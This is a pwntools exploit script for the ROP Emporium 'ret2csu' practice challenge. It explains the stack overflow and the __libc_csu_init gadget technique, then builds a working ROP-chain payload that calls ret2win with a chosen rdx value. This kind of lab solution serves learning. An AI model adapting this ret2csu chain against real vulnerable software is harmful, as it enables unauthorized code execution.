from pwn import *

'''
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)


    Challenge prompt:
        ret2csu by ROP Emporium

        Call ret2win()
        The third argument (rdx) must be 0xdeadcafebabebeef

        > 

    Code:
        void pwnme() {
          char buf [32];
          memset(buf,0,0x20);
          // ... Print a prompt ...
        
          // Null the GOT to stop simple libc leaks
          PTR_puts_00601018 = NULL;
          PTR_printf_00601028 = NULL;
          PTR_memset_00601030 = NULL;
          // Get 0xb0 chars of input and stuff them into a 0x20 byte buffer
          fgets(buf,0xb0,stdin);
          PTR_fgets_00601038 = NULL;
          return;
        }


    The overflow is super obvious, but we can't really libc leak with ROP 
    because the GOT is null-ed out by the binary.

    Instead, we can use __libc_csu_init, which handles some initialization / function setup.
    Most importantly, it contains the following two gadgets:

    Gadget 1:              Gadget 2:
    ========               =========
    pop rbx;               mov  r13d, edi
    pop rbp;               mov  r14,  rsi
    pop r12;               mov  r15,  rdx
    pop r13;               call [r12 + rbx*0x8] ; <- Note the deref here
    pop r14;
    pop r15;
    ret    ;
    (see https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf)

    Because of the deref in gadget 2, we either need to do one of the following:
    * Hope the address of ret2win is stored somewhere (it's not)
    * place the address of ret2win somewhere (for which we need more gadgets)
    * Call another function, then continue the ROP chain after it rets. (_init is a good target)

    Exploit strategy:

        1. Use gadget 1 to set an initial set of registers.
           a. rbx = 1 (to end the loop in step 2)
           a. r12 = pointer to _init()
           a. r15 = 0xdeadcafebabebeef
        2. Use gadget 2 to set RDX, which as a side effect enters the __libc_csu_init loop
        3. After the loop exits, discard 7 stack values, followed by the next ret address.
        4. ret2win

'''



context.update(arch='amd64', os='linux')
e = context.binary = ELF("./ret2csu")

if args.GDB:
    p = gdb.debug(e.path,
            # breakpoint on leave; ret; in pwnme()
            '''
            b * 0x004007af
            continue
            '''
        )
else:
    p = process(e.path)
libc = e.libc


gadget_one  = 0x0040089a
gadget_two  = 0x00400880
# Find a ref to ret2win in the binary
p_init = next(e.search(p64(e.symbols["_init"])))

offset = 40
payload  = b""
payload += b"A"*offset
payload += p64(gadget_one)
payload += p64(0)                     # RBX 
payload += p64(1)                     # RBP (set to 1, s.t. csu stops after the first iteration)
payload += p64(p_init)                # R12
payload += p64(0)                     # R13 -> new EDI (lower half)
payload += p64(0)                     # R14 -> new RSI
payload += p64(0xdeadcafebabebeef)    # R15 -> new RDX
payload += p64(gadget_two)

# After returning from the first CSU loop, we've set RDX. Now we just need to provide
# enough values for 6 register pops + 1 skip, whose contents don't matter
payload += b"i"*8*7
payload += p64(e.symbols["ret2win"])

p.sendlineafter("> ", payload)

p.interactive()

